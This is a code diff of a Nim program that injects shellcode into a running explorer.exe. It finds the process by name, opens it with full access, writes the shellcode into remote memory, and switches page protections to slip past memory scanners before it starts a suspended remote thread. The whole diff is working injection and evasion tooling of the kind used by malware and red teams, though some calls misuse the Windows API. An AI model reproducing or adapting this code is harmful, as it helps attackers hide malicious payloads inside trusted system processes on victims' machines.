@@ -1,35 +1,47 @@
 import base64
-import osproc
-import os
-
 import winim
 import winim/lean
 
+proc toString(chars: openArray[WCHAR]): string =
+    result = ""
+    for c in chars:
+        if cast[char](c) == '\0':
+            break
+        result.add(cast[char](c))
+
+proc GetProcessByName(process_name: string): DWORD =
+    var
+        pid: DWORD = 0
+        entry: PROCESSENTRY32
+        hSnapshot: HANDLE
+
+    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
+    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+    defer: CloseHandle(hSnapshot)
+
+    if Process32First(hSnapshot, addr entry):
+        while Process32Next(hSnapshot, addr entry):
+            if entry.szExeFile.toString == process_name:
+                pid = entry.th32ProcessID
+                break
+    return pid
+
 proc suspendedThread[byte](shellcode: openArray[byte]): void =
-  var op: DWORD
-  let tProcess = startProcess("notepad.exe")
-  tProcess.suspend() # That's handy!
-  defer: tProcess.close()
+  let processName: string = r"explorer.exe"
+  let processId = GetProcessbyName(processName)
 
-  let pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, cast[DWORD](tProcess.processID))
-  defer: CloseHandle(pHandle)
+  let pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, cast[DWORD](processId))
 
-  let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
+  let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_READ_WRITE)
 
   var bytesWritten: SIZE_T
-  let wSuccess = WriteProcessMemory(
-    pHandle, 
-    rPtr,
-    unsafeAddr shellcode,
-    cast[SIZE_T](shellcode.len),
-    addr bytesWritten
-  )
+  WriteProcessMemory(pHandle, rPtr, unsafeAddr shellcode, cast[SIZE_T](shellcode.len), addr bytesWritten)
 
+  var op: DWORD
   VirtualProtect(cast[LPVOID](rPtr), shellcode.len, PAGE_NOACCESS, addr op)
-  let tHandle = CreateRemoteThread(pHandle, NULL, 0, cast[LPTHREAD_START_ROUTINE](rPtr), NULL, 0x00000004, NULL)
+  let tHandle = CreateRemoteThread(pHandle, NULL, 0, cast[LPTHREAD_START_ROUTINE](rPtr), NULL, CREATE_SUSPENDED, NULL)
 
-  sleep(1000)
-  VirtualProtect(cast[LPVOID](rPtr), shellcode.len, PAGE_EXECUTE_READ_WRITE,addr op)
+  VirtualProtect(cast[LPVOID](rPtr), shellcode.len, PAGE_EXECUTE_READ_WRITE, addr op)
   ResumeThread(tHandle)
   
 when isMainModule:
